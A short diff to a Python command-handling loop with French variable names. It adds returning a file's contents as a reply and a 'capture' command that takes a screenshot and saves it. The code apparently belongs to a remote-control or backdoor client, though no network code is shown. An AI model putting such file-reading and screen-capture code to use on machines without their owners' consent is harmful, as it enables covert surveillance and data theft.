@@ -48,3 +48,9 @@ while True:
         except FileNotFoundError:
             reponse = " ".encode()
         else:
+            reponse = f.read()
+            f.close()
+    elif len(commande_split) == 2 and commande_split[0] == "capture":
+            capture_ecran = ImageGrab.grab()
+            capture_filename = commande_split[1] + ".png"
+            capture_ecran.save(capture_filename, "PNG")
